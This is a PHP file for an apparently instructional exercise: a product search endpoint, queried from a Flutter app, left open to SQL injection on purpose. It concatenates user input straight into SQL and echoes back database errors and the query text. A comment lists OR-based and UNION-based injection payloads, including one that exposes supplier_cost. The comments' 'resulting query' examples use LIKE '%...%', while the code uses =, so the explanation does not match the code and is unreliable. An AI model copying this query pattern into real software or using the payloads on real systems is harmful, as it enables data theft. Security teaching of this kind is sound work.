<?php
require_once "db.php";

// ---- Part 5: max execution time (4s) + row limit (40) ----
set_time_limit(4);           // kill the script if it runs past 4 seconds
//ini_set('max_execution_time', 4);
$ROW_LIMIT = 40;

// ---- Part 1/3/4: intentionally vulnerable search (NO sanitization) ----
// The "q" parameter is concatenated directly into the SQL string.
// This is what lets a client craft OR-based and UNION-based injections.
$q = isset($_GET['q']) ? $_GET['q'] : '';

// Base query: search product by name, limited to 40 rows (Part 5).
// Columns are fixed at 3 (id, name, price) so that Part 4's UNION
// injection (which must match column count) lines up.

$sql = "SELECT id, name, price FROM products WHERE name = '$q' LIMIT $ROW_LIMIT";
$result = $conn->query($sql);

$products = [];

if ($result === false) {
    // Surfacing the DB error is itself part of the vulnerability (error-based
    // injection feedback) but also useful while you're testing payloads.
    http_response_code(400);
    echo json_encode(["error" => $conn->error, "sql" => $sql]);
    exit();
}

while ($row = $result->fetch_assoc()) {
    $products[] = $row;
}

echo json_encode($products);

/*
=====================================================================
PAYLOADS TO USE FROM THE FLUTTER SEARCH FIELD
=====================================================================

Part 1 — dump everything with an OR injection:
    ' OR '1'='1
  -> resulting query:
     SELECT id, name, price FROM products WHERE name LIKE '%' OR '1'='1%' LIMIT 40
  (any OR 1=1-style payload that always evaluates true works)

Part 3 — narrow the OR injection down to only product id = 2:
    ' OR id=2 -- -
  -> resulting query:
     SELECT id, name, price FROM products WHERE name LIKE '%' OR id=2 -- -%' LIMIT 40
  Everything after "-- " is commented out, so only id=2 is returned.

Part 4 — UNION injection to show supplier_cost instead of price:
    ' UNION SELECT id, name, supplier_cost FROM products -- -
  -> resulting query:
     SELECT id, name, price FROM products WHERE name LIKE '%'
     UNION SELECT id, name, supplier_cost FROM products -- -%' LIMIT 40
  The original row(s) usually return nothing useful (no name matches the
  empty '%'), so what the UI shows is really the UNIONed rows, whose
  "price" column is actually supplier_cost.
=====================================================================
*/
